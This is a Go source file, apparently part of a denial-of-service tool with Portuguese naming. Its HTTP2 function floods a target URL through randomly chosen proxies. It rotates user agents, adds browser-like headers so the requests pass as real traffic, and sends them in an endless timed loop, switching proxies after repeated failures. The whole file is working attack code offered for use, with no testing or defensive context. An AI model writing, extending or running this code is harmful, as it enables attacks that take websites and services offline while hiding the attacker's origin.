package main

import (
	"fmt"
	"golang.org/x/net/http2"
	"math/rand"
	"net/http"
	url2 "net/url"
	"sync"
	"time"
)

var start = make(chan bool)

func HTTP2(wg *sync.WaitGroup) {
	var errs int
	errs = -1
	restart:
	proxy := ProxiesCarregadas[rand.Intn(len(ProxiesCarregadas))]
	//fmt.Println(proxy)
	url, err := url2.Parse(fmt.Sprintf("http://%s", proxy))
	if err != nil {
		fmt.Println("Erro de parameto nas proxies. Cheque o arquivo das proxy.")
		return
	}
	x, err := url.Parse(Sys.Ataque.Url)
	if err != nil {
		fmt.Println("Erro de parametro... Cheque o Url.")
		return
	}
	Http2ProxyConfiguracao := &http.Transport{
		Proxy: http.ProxyURL(url),
	}
	_, err = http2.ConfigureTransports(Http2ProxyConfiguracao)
	if err != nil {
		fmt.Println("Não pode ser HTTP2.")
		return
	}
	client := http.Client{
		Timeout: time.Duration(Sys.HTTP2Timeout)*time.Millisecond,
		Transport: Http2ProxyConfiguracao,
	}
	req, err := http.NewRequest(Sys.Ataque.AtaqueMetodo, Sys.Ataque.Url, nil)
	if err != nil {
		fmt.Println("Não pude construir as requests")
		return
	}
	if Sys.Ataque.Host != "" {
		req.Header.Set("Host", Sys.Ataque.Host)
	}
	if Sys.Ataque.Cookie != nil {
		req.Header.Add("cookie", Sys.Ataque.Cookie.(string))
	}
	req.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
	req.Header.Set("authority", x.Host)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("upgrade-insecure-requests", "1")
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("sec-fetch-user", "?1")
	req.Header.Set("sec-fetch-dest", "document")
	if errs == -1 {
		wg.Done()
		<-start
	}
	for range time.Tick(time.Millisecond*time.Duration(1000.0/Sys.Ataque.RequestPorIp)) {
		_, err = client.Do(req)
		if err != nil {
			errs++
			if errs > 10 {
				errs=0
				goto restart
			}
		}
	}
}